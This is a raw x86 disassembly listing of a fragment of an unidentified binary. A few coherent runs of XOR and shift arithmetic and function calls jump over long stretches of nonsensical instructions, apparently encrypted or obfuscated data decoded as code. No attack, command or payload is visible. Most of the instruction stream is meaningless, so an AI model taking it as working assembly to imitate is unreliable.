  413053:	fisttp DWORD PTR [edx+0x5ad11435]
  413059:	adc    DWORD PTR [ebx-0x7a],esp
  41305c:	cmp    ebp,eax
  41305e:	jmp    0x413097
  413060:	xor    BYTE PTR [edx-0x5410a3ef],ah
  413066:	pusha  
  413067:	adc    eax,0xc2e85051
  41306c:	out    dx,eax
  41306d:	add    BYTE PTR [eax],al
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [ebp+ebx*4-0x3c],edi
  4130e0:	fwait
  4130e1:	jo     0x4130b6
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [edi-0x53],ch
  4130ec:	sub    BYTE PTR [eax],dh
  4130ee:	inc    edi
  4130ef:	pop    ebp
  4130f0:	push   0xfffffff1
  4130f2:	js     0x4130e8
  4130f4:	cmp    BYTE PTR [eax+0x49eca1a5],bh
  4130fa:	into   
  4130fb:	test   al,0x6a
  4130fd:	(bad)  
  4130fe:	in     al,dx
  4130ff:	sub    dl,BYTE PTR [edi]
  413101:	int    0x7d
  413103:	inc    eax
  413104:	cmp    eax,0xa2b37b11
  413109:	cmp    dl,dh
  41310b:	sbb    al,0x4d
  41310d:	jp     0x413101
  41310f:	dec    eax
  413110:	inc    ecx
  413111:	in     eax,dx
  413112:	mov    ecx,0x5ff96953
  413117:	aam    0xb5
  413119:	idiv   BYTE PTR [edi+0x4e]
  41311c:	push   ecx
  41311d:	fist   WORD PTR [ebx+eiz*2+0x6c]
  413121:	and    al,0xe1
  413123:	sub    dl,dl
  413125:	dec    ebx
  413126:	shl    edi,1
  413128:	popa   
  413129:	sahf   
  41312a:	add    al,0x29
  41312c:	repz push edx
  41312e:	repnz add eax,0x58962ab0
  413134:	xor    DWORD PTR [esi+0x61],ebp
  413137:	mov    ds:0xb4e949da,al
  41313c:	ja     0x413122
  41313e:	mov    ebx,0x42540e4
  413143:	add    eax,0xe90ba910
  413148:	add    DWORD PTR [esi],ecx
  41314a:	jle    0x41312e
  41314c:	test   al,bh
  41314e:	mov    dh,0x26
  413150:	xor    DWORD PTR [ebp-0x35],ecx
  413153:	push   esi
  413154:	jns    0x413151
  413156:	aas    
  413157:	push   ds
  413158:	xchg   ebx,eax
  413159:	rcl    DWORD PTR [eax-0x5eb6132b],0xaf
  413160:	arpl   WORD PTR [ebx-0x4943113d],bp
  413166:	cwde   
  413167:	adc    DWORD PTR [ebp-0x4a],ecx
  41316a:	test   DWORD PTR [esi-0x5d3f9658],esp
  413170:	cdq    
  413171:	lds    eax,FWORD PTR [ebx+0x544e5cac]
  413177:	call   0xc2d:0x8ab20b0c
  41317e:	imul   edi,DWORD PTR [edi+0x76],0x42
  413182:	outs   dx,DWORD PTR ds:[esi]
  413183:	je     0x413177
  413185:	aad    0x9a
  413187:	and    dh,BYTE PTR [edx]
  413189:	push   0xffffffcb
  41318b:	fs adc eax,0xa294ee5c
  413191:	icebp  
  413192:	jecxz  0x4131ae
  413194:	stc    
  413195:	enter  0xc8b7,0x4d
  413199:	xchg   DWORD PTR [eax+esi*4+0x75],eax
  41319d:	mov    ebx,0x940c0f35
  4131a2:	pop    edi
  4131a3:	cmp    eax,0x5fdde0dc
  4131a8:	sub    al,0x34
  4131aa:	dec    ebp
  4131ab:	loop   0x41320b
  4131ad:	icebp  
  4131ae:	mov    dh,0xc7
  4131b0:	push   cs
  4131b1:	lods   al,BYTE PTR ds:[esi]
  4131b2:	cld    
  4131b3:	fldenv [esi-0x51]
  4131b6:	(bad)  [eax+0x74]
  4131b9:	int    0x38
  4131bb:	jl     0x413196
  4131bd:	xor    ebx,DWORD PTR [bx-0x13]
  4131c1:	mov    esp,0x9ba60440
  4131c6:	lock cmp ecx,ecx
  4131c9:	mov    ?,WORD PTR [edi]
  4131cb:	add    eax,0xc708ab1f
  4131d0:	out    dx,eax
  4131d1:	and    eax,0x97f39fd9
  4131d6:	adc    esp,ecx
  4131d8:	jo     0x413175
  4131da:	fidiv  DWORD PTR [edx-0x14]
  4131dd:	jg     0x413237
  4131df:	mov    ch,0x78
  4131e1:	inc    eax
  4131e2:	pop    ds
  4131e3:	clc    
  4131e4:	in     al,0x7a
  4131e6:	adc    eax,0xbf3179d9
  4131eb:	xor    al,0xe0
  4131ed:	adc    ch,BYTE PTR [edx]
  4131ef:	mov    esp,DWORD PTR [ebx+0x36]
  4131f2:	cdq    
  4131f3:	bound  edx,QWORD PTR [ebx-0x19]
  4131f6:	push   edi
  4131f7:	xchg   esi,eax
  4131f8:	jge    0x4131ad
  4131fa:	add    al,0xb8
  4131fc:	push   ss
  4131fd:	adc    BYTE PTR [edi+0x54],dh
  413200:	sbb    eax,0xb086f912
  413205:	or     DWORD PTR [ecx+0x73829126],edi
  41320b:	sbb    ch,BYTE PTR [edi]
  41320d:	xor    al,0x1e
  41320f:	adc    eax,0xfd91ee64
  413214:	push   ebx
  413215:	mov    eax,0x3397d1e1
  41321a:	sbb    DWORD PTR [edi+0x4445dccd],edi
  413220:	scas   al,BYTE PTR es:[edi]
  413221:	(bad)  
  413222:	jb     0x413240
  413224:	and    eax,0x25da8697
  413229:	push   ds
  41322a:	or     ah,ch
  41322c:	pop    ds
  41322d:	lods   eax,DWORD PTR ds:[esi]
  41322e:	mov    cl,al
  413230:	mov    eax,ds:0x2df1b83
  413235:	loopne 0x4131e0
  413237:	jge    0x4132b7
  413239:	xchg   edx,eax
  41323a:	test   BYTE PTR [ebx-0x6ed8e65f],dl
  413240:	loopne 0x4132ab
  413242:	ins    DWORD PTR es:[edi],dx
  413243:	adc    eax,0xe9647b4c
  413248:	loopne 0x413206
  41324a:	cld    
  41324b:	mov    BYTE PTR [ebx+esi*2+0x50491f96],bh
  413252:	in     al,dx
  413253:	push   edx
  413254:	add    BYTE PTR ds:0x486b7d4a,bh
  41325a:	mov    DWORD PTR [eax-0x47],0x563cdc12
  413261:	icebp  
  413262:	sahf   
  413263:	mov    edx,0x5e9b074a
  413268:	aas    
  413269:	push   esi
  41326a:	in     eax,0xa8
  41326c:	or     ah,BYTE PTR [edx+edx*2]
  41326f:	mov    esi,0x57d703ca
  413274:	cmp    al,0x59
  413276:	cmp    DWORD PTR [ebx+0x29],esi
  413279:	xchg   DWORD PTR [eax],ebx
  41327b:	sub    esi,eax
  41327d:	mov    ecx,DWORD PTR [eax]
  41327f:	stc    
  413280:	pop    ebx
  413281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413282:	xchg   ebp,eax
  413283:	mov    ebp,0x12e3668d
  413288:	imul   ecx,DWORD PTR [ebp+0x5],0x4b450607
  41328f:	push   0xffffffcb
  413291:	push   esi
  413292:	jecxz  0x41323c
  413294:	and    eax,0xada80f1e
  413299:	add    al,0x24
  41329b:	(bad)  
  41329c:	sub    eax,0xc15bd0b6
  4132a1:	loop   0x4132d6
  4132a3:	js     0x4132d4
  4132a5:	loopne 0x413250
  4132a7:	mov    dh,0x7c
  4132a9:	and    ebx,DWORD PTR [edi-0x37]
  4132ac:	aas    
  4132ad:	push   edi
  4132ae:	sub    al,BYTE PTR [edx]
  4132b0:	pop    ecx
  4132b1:	adc    ebp,esp
  4132b3:	(bad)  
  4132b4:	mov    esi,DWORD PTR [edx+ebx*2-0x7978361c]
  4132bb:	lock test eax,0x3090047a
  4132c1:	shr    DWORD PTR [esi-0x6c64127b],cl
  4132c7:	lock cdq 
  4132c9:	aaa    
  4132ca:	push   esi
  4132cb:	xchg   ebp,eax
  4132cc:	mov    WORD PTR [ebx],?
  4132ce:	mov    cl,0xc3
  4132d0:	cmc    
  4132d1:	xor    eax,0x2ba91bf2
  4132d6:	ss dec edx
  4132d8:	pop    ebx
  4132d9:	sub    esi,DWORD PTR [edx+0x4f160399]
  4132df:	imul   edx,ebp,0x12590cc0
  4132e5:	mov    al,0xa1
  4132e7:	sbb    al,0x6
  4132e9:	cmp    BYTE PTR [edx],dl
  4132eb:	scas   al,BYTE PTR es:[edi]
  4132ec:	mov    ecx,0xb2e270c
  4132f1:	repnz pop ebx
  4132f3:	scas   eax,DWORD PTR es:[edi]
  4132f4:	pop    edi
  4132f5:	inc    ecx
  4132f6:	xchg   ebp,eax
  4132f7:	fucomi st,st(6)
  4132f9:	imul   ebp,DWORD PTR [edi+ecx*2-0x6f],0xffffff86
  4132fe:	pop    ecx
  4132ff:	push   edi
  413300:	scas   al,BYTE PTR es:[edi]
  413301:	sti    
  413302:	adc    ecx,ecx
  413304:	(bad)  
  413305:	test   al,0x6b
  413307:	test   BYTE PTR [esp+eax*4+0x7d],0xa9
  41330c:	mov    ah,0xdf
  41330e:	cmp    DWORD PTR [edi-0x69b3b0f3],eax
  413314:	pushf  
  413315:	cdq    
  413316:	sub    ebp,DWORD PTR [ecx]
  413318:	push   esp
  413319:	inc    ebx
  41331a:	fimul  WORD PTR [edx]
  41331c:	push   esp
  41331d:	adc    DWORD PTR [ecx+ecx*8+0x40dd955a],0xd56ebd99
  413328:	outs   dx,BYTE PTR ds:[esi]
  413329:	out    dx,eax
  41332a:	ss in  eax,0x65
  41332d:	(bad)  
  41332e:	shl    DWORD PTR [edi-0x6e77afff],0x1a
  413335:	dec    esi
  413336:	repz inc eax
  413338:	lds    ebx,FWORD PTR [esi-0x44da4368]
  41333e:	mov    ebp,0x8bcacc73
  413343:	(bad)  
  413344:	jge    0x413312
  413346:	sub    eax,0x1eaf9723
  41334b:	and    edx,DWORD PTR [edx-0x28]
  41334e:	add    eax,0xfb105f46
  413353:	lock in al,dx
  413355:	in     al,dx
  413356:	bound  ebp,QWORD PTR [esi+0x4f23a6c2]
  41335c:	sahf   
  41335d:	mov    WORD PTR [esi+ecx*1+0x75],gs
  413361:	(bad)  
  413362:	outs   dx,BYTE PTR ds:[esi]
  413363:	add    ch,BYTE PTR [ebx]
  413365:	fsub   QWORD PTR [edx-0x4b]
  413368:	sbb    dh,BYTE PTR [ecx-0x6882f3c6]
  41336e:	or     BYTE PTR [ebx],ch
  413370:	or     al,0x95
  413372:	fsub   DWORD PTR [edi-0x11]
  413375:	loop   0x413364
  413377:	ds jnp 0x413313
  41337a:	pop    edx
  41337b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41337c:	jnp    0x4133f6
  41337e:	ret    0x9df7
  413381:	shl    DWORD PTR [esi-0x24],1
  413384:	inc    edx
  413385:	xor    BYTE PTR [ebx+0x32],ah
  413388:	outs   dx,BYTE PTR ds:[esi]
  413389:	shl    BYTE PTR [ecx],cl
  41338b:	ror    DWORD PTR [esi],cl
  41338d:	sub    al,0x9d
  41338f:	repnz outs dx,DWORD PTR ds:[esi]
  413391:	(bad)  
  413392:	cmp    al,0x7e
  413394:	cmp    ecx,esp
  413396:	fstp   DWORD PTR [edx+0x27c4cbca]
  41339c:	and    ebp,ecx
  41339e:	add    DWORD PTR [esi-0x5152f682],edx
  4133a4:	ret    0x1580
  4133a7:	xchg   ebx,eax
  4133a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a9:	ds pop ecx
  4133ab:	daa    
  4133ac:	dec    ebx
  4133ad:	test   eax,0xa7a06140
  4133b2:	xchg   edx,ebp
  4133b4:	dec    ecx
  4133b5:	ds mov edi,0x4f309065
  4133bb:	sti    
  4133bc:	jno    0x413429
  4133be:	das    
  4133bf:	sahf   
  4133c0:	loope  0x41343a
  4133c2:	cmove  ebp,DWORD PTR [esi+0x55a6985]
  4133c9:	mov    ds:0x28498ab0,eax
  4133ce:	lods   eax,DWORD PTR ds:[esi]
  4133cf:	push   es
  4133d0:	jmp    0x1e82:0xfc14222
  4133d7:	in     eax,dx
  4133d8:	test   al,bl
  4133da:	mov    eax,0x84e93165
  4133df:	mov    ecx,0x3f6db6b1
  4133e4:	stos   DWORD PTR es:[edi],eax
  4133e5:	add    cl,dh
  4133e7:	dec    ebp
  4133e8:	push   ebp
  4133e9:	retf   
  4133ea:	mov    al,0x3
  4133ec:	fwait
  4133ed:	or     bh,dl
  4133ef:	pusha  
  4133f0:	jno    0x41345c
  4133f2:	sti    
  4133f3:	mov    al,0x6b
  4133f5:	inc    dh
  4133f7:	or     cl,BYTE PTR [ecx]
  4133f9:	jnp    0x413442
  4133fb:	les    edi,FWORD PTR [esi+0x46600323]
  413401:	cld    
  413402:	(bad)  
  413403:	test   DWORD PTR [ebp+0x49],ebx
  413406:	ins    BYTE PTR es:[edi],dx
  413407:	mov    ch,0x1b
  413409:	(bad)  
  41340a:	hlt    
  41340b:	outs   dx,BYTE PTR ds:[esi]
  41340c:	inc    ebp
  41340d:	(bad)  
  41340e:	jno    0x413395
  413410:	cmp    eax,0x632b851f
  413415:	inc    esp
  413416:	stc    
  413417:	cmp    al,0x3c
  413419:	xchg   esi,eax
  41341a:	packuswb mm6,QWORD PTR [ecx+0xc725d99]
  413421:	cmp    eax,0x5b9185da
  413426:	std    
  413427:	(bad)  
  413428:	sub    DWORD PTR [esi],0xffffffae
  41342b:	fnstsw ax
  41342d:	test   al,0xd4
  41342f:	or     al,0xef
  413431:	mov    dh,0x29
  413433:	int3   
  413434:	clc    
  413435:	daa    
  413436:	(bad)  
  413437:	out    dx,al
  413438:	adc    al,dh
  41343a:	loopne 0x4134a0
  41343c:	push   ebx
  41343d:	jge    0x413460
  41343f:	jns    0x4133eb
  413441:	mov    ecx,0xa580b746
  413446:	inc    eax
  413447:	aas    
  413448:	add    DWORD PTR ds:0xe429e1b7,eax
  41344e:	xlat   BYTE PTR ds:[ebx]
  41344f:	ret    
  413450:	push   0xffffffb9
  413452:	jle    0x41341e
  413454:	lods   al,BYTE PTR ds:[esi]
  413455:	sbb    edi,ebx
  413457:	xchg   edx,eax
  413458:	sbb    BYTE PTR [esi+0x6e],cl
  41345b:	shl    DWORD PTR [eax],1
  41345d:	es jle 0x41349b
  413460:	push   es
  413461:	daa    
  413462:	enter  0x8fbb,0xef
  413466:	das    
  413467:	mov    BYTE PTR [edx],cl
  413469:	scas   eax,DWORD PTR es:[edi]
  41346a:	les    ecx,FWORD PTR [ebp+0x59b26ed1]
  413470:	nop
  413471:	nop
  413472:	xchg   ebp,eax
  413473:	mov    esp,0x28430192
  413478:	sub    edx,ecx
  41347a:	ds pushf 
  41347c:	xchg   BYTE PTR [edi+0x2dd605cd],dh
  413482:	xchg   edi,eax
  413483:	mov    dh,0x57
  413485:	mov    esp,0x86c080e7
  41348a:	sub    bl,BYTE PTR [eax+0x8]
  41348d:	ins    BYTE PTR es:[edi],dx
  41348e:	dec    esi
  41348f:	and    ebx,DWORD PTR [ecx-0x51d3ada5]
  413495:	pop    edi
  413496:	out    dx,al
  413497:	cmp    eax,0xdc7b62c7
  41349c:	push   esp
  41349d:	arpl   dx,cx
  41349f:	mov    edx,0x21bf660c
  4134a4:	stos   DWORD PTR es:[edi],eax
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x422031
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx-0x57ce8f61]
  4134d4:	ja     0x413552
  4134d6:	fs inc edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [edi],bl
  4134df:	sbb    ebx,DWORD PTR [ecx+0x75e7bcde]
  4134e5:	mov    al,0x81
  4134e7:	mov    eax,0xfd28d5f2
  4134ec:	loope  0x4134f5
  4134ee:	into   
  4134ef:	arpl   WORD PTR [edx],ax
  4134f1:	dec    esp
  4134f2:	in     al,dx
  4134f3:	enter  0x941a,0xe6
  4134f7:	jge    0x4134d7
  4134f9:	mov    cl,BYTE PTR [esi+0x114d6e61]
  4134ff:	(bad)  
  413502:	iret   
  413503:	jmp    0x4d9:0xe1d542dc
  41350a:	cmp    DWORD PTR [edi+ebp*1],esi
  41350d:	bnd jno 0x4134a0
  413510:	mov    cs,WORD PTR [edi-0x4e]
  413513:	xlat   BYTE PTR ds:[ebx]
  413514:	mov    ds:0xe27c4b38,eax
  413519:	mov    esi,DWORD PTR [esi+eiz*2-0x71]
  41351d:	mov    al,0x34
  41351f:	sub    edi,ebx
  413521:	mov    eax,0x96330ea2
  413526:	out    dx,eax
  413527:	xor    dh,ch
  413529:	jp     0x4135a9
  41352b:	(bad)  
  41352c:	call   0xad841402
  413531:	int3   
  413532:	jecxz  0x4134c9
  413534:	push   0xc043d0dc
  413539:	outs   dx,BYTE PTR ds:[esi]
  41353a:	test   BYTE PTR [ebx+0x18],al
  41353d:	mov    dh,0x87
  41353f:	sub    al,0x20
  413541:	mov    dh,0xaf
  413543:	jge    0x413506
  413545:	ror    BYTE PTR [esp+ebx*4+0x6c8be282],0x57
  41354d:	jnp    0x413505
  41354f:	mov    BYTE PTR [edi-0x39],al
  413552:	mov    ah,0x83
  413554:	pop    ds
  413555:	cli    
  413556:	ds aaa 
  413558:	scas   al,BYTE PTR es:[edi]
  413559:	ins    DWORD PTR es:[edi],dx
  41355a:	dec    ebp
  41355b:	nop
  41355c:	sub    eax,0x4cc66347
  413561:	les    esp,FWORD PTR [esi-0x32aa579c]
  413567:	adc    al,0xee
  413569:	(bad)  
  41356a:	rcr    edx,1
  41356c:	retf   
  41356d:	imul   esp,DWORD PTR [ebx],0xe856dcdc
  413573:	jmp    0x41358d
  413575:	sub    eax,0xebfc49f
  41357a:	fs inc esi
  41357c:	(bad)  
  41357d:	outs   dx,BYTE PTR ds:[esi]
  41357e:	lahf   
  41357f:	dec    edi
  413580:	jl     0x4135d6
  413582:	sbb    DWORD PTR [esi],edx
  413584:	add    DWORD PTR [ebp-0xcc87bf4],esi
  41358a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41358b:	std    
  41358c:	in     al,dx
  41358d:	jns    0x413607
  41358f:	jmp    0x413529
  413591:	push   ebp
  413592:	mov    ?,WORD PTR [esi-0x7b697028]
  413598:	mov    edi,0xc6b5361f
  41359d:	aad    0xb7
  41359f:	fwait
  4135a0:	mov    eax,0x1d423140
  4135a5:	outs   dx,DWORD PTR ds:[esi]
  4135a6:	shr    BYTE PTR [edi],0x43
  4135a9:	aad    0xc0
  4135ab:	jo     0x41354f
  4135ad:	jb     0x4135a2
  4135af:	dec    ecx
  4135b0:	push   esp
  4135b1:	int    0xb6
  4135b3:	dec    esi
  4135b4:	cmp    al,0x29
  4135b6:	xchg   edi,eax
  4135b7:	(bad)  
  4135b8:	shl    BYTE PTR [edi-0x298e23b1],0x79
  4135bf:	sub    BYTE PTR [edx],bh
  4135c1:	push   es
  4135c2:	adc    ah,BYTE PTR [edi-0x2954cf07]
  4135c8:	mov    ds:0x6ee63d89,eax
  4135cd:	mov    ebx,0x6f4966f7
  4135d2:	(bad)  
  4135d3:	adc    eax,0x4669da9e
  4135d8:	loop   0x4135dc
  4135da:	rcr    DWORD PTR [ebx],0x23
  4135dd:	jmp    0xf27c:0xb0808726
  4135e4:	xor    eax,0x19977abe
  4135e9:	jbe    0x4135ac
  4135eb:	ret    0xba71
  4135ee:	mov    dl,0xc5
  4135f0:	bound  ebp,QWORD PTR [esi+0x1c]
  4135f3:	test   BYTE PTR [ebp-0x3000b09c],bh
  4135f9:	std    
  4135fa:	lock std 
  4135fc:	mov    al,0x6e
  4135fe:	inc    esp
  4135ff:	test   esp,esp
  413601:	adc    al,0x8c
  413603:	dec    ebx
  413604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413605:	das    
  413606:	jno    0x413652
  413608:	mov    ds:0xd1e6279c,al
  41360d:	(bad)  [esi]
  41360f:	add    ah,dh
  413611:	lods   eax,DWORD PTR ds:[esi]
  413612:	adc    eax,0xdf9de9d7
  413617:	jecxz  0x41360d
  413619:	or     eax,0x69568b7a
  41361e:	mov    ?,WORD PTR [ebp+0x2c79ad60]
  413624:	mov    ah,0x48
  413626:	mov    esp,DWORD PTR [esi]
  413628:	fild   DWORD PTR [edi-0x60aaf32d]
  41362e:	xchg   BYTE PTR [esi+0x63],ah
  413631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413632:	popa   
  413633:	test   BYTE PTR [ecx],bh
  413635:	push   cs
  413636:	pop    eax
  413637:	aad    0x71
  413639:	lods   al,BYTE PTR ds:[esi]
  41363a:	sti    
  41363b:	(bad)  
  41363c:	out    0x3d,al
  41363e:	sbb    BYTE PTR [ebx+0x5e],dh
  413641:	dec    ecx
  413642:	pop    ss
  413643:	rcl    DWORD PTR [eax+0x499322e7],1
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	rcl    DWORD PTR [edi-0x2d3474e7],0x9d
  413651:	inc    ebx
  413652:	jl     0x413612
  413654:	data16 jp 0x4135df
  413657:	pop    ss
  413658:	pop    edi
  413659:	jb     0x413640
  41365b:	jp     0x4136c6
  41365d:	shl    al,0x28
  413660:	mov    esi,0xdfb77364
  413665:	or     edx,DWORD PTR [eax+0x2c]
  413668:	push   ecx
  413669:	scas   al,BYTE PTR es:[edi]
  41366a:	inc    edx
  41366b:	mov    ecx,DWORD PTR [eax+0x4b]
  41366e:	aam    0xac
  413670:	inc    ecx
  413671:	mov    ds:0x7e9cf5c3,al
  413676:	pop    esi
  413677:	xchg   DWORD PTR [eax+0x5d],ebp
  41367a:	jnp    0x413696
  41367c:	bound  ebx,QWORD PTR [esi-0x52]
  41367f:	mov    esi,ecx
  413681:	push   ecx
  413682:	fnstenv [esp+ebp*2-0x3e]
  413686:	push   edi
  413687:	inc    BYTE PTR [edx]
  413689:	mov    ch,0xc6
  41368b:	or     BYTE PTR ds:0x7742710e,dl
  413691:	lods   al,BYTE PTR ds:[esi]
  413692:	retf   
  413693:	mov    al,0x33
  413695:	or     edi,DWORD PTR [esi]
  413697:	xchg   ecx,edi
  413699:	cmove  edx,DWORD PTR [edx-0xf]
  41369d:	jp     0x413704
  41369f:	bound  esp,QWORD PTR [esi]
  4136a1:	pop    ebx
  4136a2:	shr    ch,0xe3
  4136a5:	stos   BYTE PTR es:[edi],al
  4136a6:	ins    BYTE PTR es:[edi],dx
  4136a7:	fiadd  WORD PTR [ecx+0x1d]
  4136aa:	out    0x43,eax
  4136ac:	jo     0x4136ba
  4136ae:	inc    esp
  4136af:	(bad)  
  4136b0:	mov    ebx,0xc7055fe3
  4136b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b6:	ja     0x41368e
  4136b8:	int    0x87
  4136ba:	daa    
  4136bb:	mov    bh,0x7e
  4136bd:	jmp    0x251b5bc7
  4136c2:	cmp    BYTE PTR [ecx],bh
  4136c4:	sub    BYTE PTR es:[edi+0x2b],0x8d
  4136c9:	aaa    
  4136ca:	das    
  4136cb:	add    DWORD PTR [eax],ebx
  4136cd:	mov    al,0xb6
  4136cf:	dec    esp
  4136d0:	ja     0x4136da
  4136d2:	inc    eax
  4136d3:	(bad)  
  4136d5:	(bad)  
  4136d6:	mov    cl,0x97
  4136d8:	cmovge eax,DWORD PTR [ecx+0x4dd7e7e9]
  4136df:	mov    al,ds:0x13ce35ca
  4136e4:	mov    BYTE PTR [ecx+0x2a1541ba],dl
  4136ea:	in     eax,0x72
  4136ec:	leave  
  4136ed:	pop    ebx
  4136ee:	and    bh,BYTE PTR [ebp+0x680975d9]
  4136f4:	cdq    
  4136f5:	mov    al,0xb0
  4136f7:	lock ret 0x7b9f
  4136fb:	pop    ds
  4136fc:	cmp    al,0x9d
  4136fe:	push   ecx
  4136ff:	ror    DWORD PTR [esp+eiz*2-0x136714ac],1
  413706:	mov    al,0xd8
  413708:	jns    0x413705
  41370a:	push   ebp
  41370b:	sub    al,0x3a
  41370d:	fs loop 0x41374b
  413710:	mov    esp,0x909f9b2f
  413715:	in     eax,dx
  413716:	jmp    0x37c7ff4d
  41371b:	push   eax
  41371c:	jo     0x4136af
  41371e:	mov    bl,0x97
  413720:	dec    ecx
  413721:	or     BYTE PTR [eax-0x1c21cb56],ah
  413727:	mov    ebp,0xdcd5580f
  41372c:	scas   al,BYTE PTR es:[edi]
  41372d:	xchg   esp,eax
  41372e:	mov    cl,0xae
  413730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413731:	stos   BYTE PTR es:[edi],al
  413732:	(bad)  
  413733:	or     al,ah
  413735:	adc    al,al
  413737:	shl    DWORD PTR [ecx+eax*8-0x2d5978c7],0xce
  41373f:	ins    BYTE PTR es:[edi],dx
  413740:	fcmovne st,st(3)
  413742:	nop    WORD PTR [ecx-0x5c]
  413747:	mov    BYTE PTR [ecx-0x4562e717],bl
  41374d:	mov    al,0xd9
  41374f:	xor    al,0x47
  413751:	push   0x5f456083
  413756:	add    eax,ebx
  413758:	out    dx,al
  413759:	cmp    BYTE PTR [edi-0x7d],ch
  41375c:	mov    ecx,0x9dead169
  413761:	inc    esp
  413762:	add    DWORD PTR [ecx+0x27],ebx
  413765:	push   ds
  413766:	std    
  413767:	push   esi
  413768:	in     eax,0xa7
  41376a:	iret   
  41376b:	iret   
  41376c:	xor    ah,BYTE PTR [edx-0x6740e6fa]
  413772:	sbb    ah,BYTE PTR [ecx+0x2915bba0]
  413778:	es aad 0x5b
  41377b:	cmp    ebp,eax
  41377d:	or     DWORD PTR [esi],ebx
  41377f:	ss xchg ebp,eax
  413781:	add    ebx,DWORD PTR [ecx*1+0x50061a67]
  413788:	pop    ds
  413789:	sbb    cl,BYTE PTR [eax-0x72]
  41378c:	cdq    
  41378d:	pusha  
  41378e:	pop    es
  41378f:	mov    cl,0x34
  413791:	xlat   BYTE PTR ds:[ebx]
  413792:	pop    edx
  413793:	and    DWORD PTR [edx],edx
  413795:	in     eax,dx
  413796:	mov    al,0x93
  413798:	xchg   ebp,eax
  413799:	fistp  DWORD PTR [eax+0x4a42c123]
  41379f:	jp     0x41377e
  4137a1:	or     al,BYTE PTR fs:[esi+0x1bc8fb81]
  4137a8:	dec    edx
  4137a9:	(bad)  
  4137aa:	jbe    0x413782
  4137ac:	cmc    
  4137ad:	icebp  
  4137ae:	xor    eax,0xb691f6d7
  4137b3:	jge    0x4137e6
  4137b5:	mov    esp,0x299ac7b9
  4137ba:	xor    al,0xbd
  4137bc:	push   esi
  4137bd:	mov    dl,BYTE PTR [esi+eiz*1]
  4137c0:	cld    
  4137c1:	xor    al,0x8c
  4137c3:	enter  0xf1b3,0xb9
  4137c7:	push   edi
  4137c8:	push   esi
  4137c9:	mul    DWORD PTR [edx+0x101c9116]
  4137cf:	mov    ecx,0x734a7ed0
  4137d4:	out    dx,eax
  4137d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137d6:	les    esp,FWORD PTR [edx+0xfd812a1]
  4137dc:	xchg   BYTE PTR [esi+0x10],ch
  4137df:	add    edx,0x94018e77
  4137e5:	fwait
  4137e6:	and    eax,ecx
  4137e8:	jns    0x413773
  4137ea:	aad    0xc4
  4137ec:	shl    DWORD PTR [esi+esi*4],0xe5
  4137f0:	pop    ss
  4137f1:	xor    esi,0xd377d4e5
  4137f7:	popf   
  4137f8:	push   cs
  4137f9:	push   ebx
  4137fa:	data16 xor bl,BYTE PTR [ebx+0xb]
  4137fe:	sub    DWORD PTR [esi],eax
  413800:	cli    
  413801:	lods   al,BYTE PTR ds:[esi]
  413802:	or     ah,bh
  413804:	cld    
  413805:	mov    WORD PTR [edx+eiz*2-0x16],fs
  413809:	fs pop eax
  41380b:	test   eax,0xbbac030
  413810:	ficom  WORD PTR ds:0xa5d02796
  413816:	inc    ebx
  413817:	xchg   esp,eax
  413818:	neg    ecx
  41381a:	hlt    
  41381b:	or     BYTE PTR [ebp+0x137e9d6e],0x18
  413822:	pop    ecx
  413823:	outs   dx,DWORD PTR ds:[esi]
  413824:	mov    ebx,0x96cc14f9
  413829:	pop    ebx
  41382a:	or     BYTE PTR [edx],bh
  41382c:	fwait
  41382d:	cli    
  41382e:	in     al,dx
  41382f:	in     al,0xd4
  413831:	neg    DWORD PTR [ecx-0x4615e3cc]
  413837:	rol    BYTE PTR [ebx-0x2c278826],0xc0
